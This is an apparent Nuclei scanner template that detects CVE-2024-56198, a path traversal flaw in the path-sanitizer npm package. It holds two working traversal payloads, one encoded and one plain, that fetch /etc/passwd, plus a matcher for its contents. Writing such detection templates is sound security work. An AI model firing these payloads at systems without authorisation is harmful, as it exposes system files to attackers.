id: CVE-2024-56198

info:
  name: Path Traversal in path-sanitizer npm package
  author: KoYejune0302
  severity: critical
  description: |
    This template detects the path traversal vulnerability in the path-sanitizer npm package.
    The vulnerability allows an attacker to bypass the path sanitization and access files outside the intended directory.
  classification:
    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
    cvss-score: 9.3
    cve-id: CVE-2024-56198
  reference:
    - https://github.com/advisories/GHSA-94p5-r7cc-3rpr
    - https://nvd.nist.gov/vuln/detail/CVE-2024-56198
  tags: cve,cve2024,path-traversal,path-sanitizer,npm

requests:
  - method: GET
    path:
      - "{{BaseURL}}/route?path=..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5cetc/passwd"
      - "{{BaseURL}}/route?path=../../../../../../../../etc/passwd"

    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body
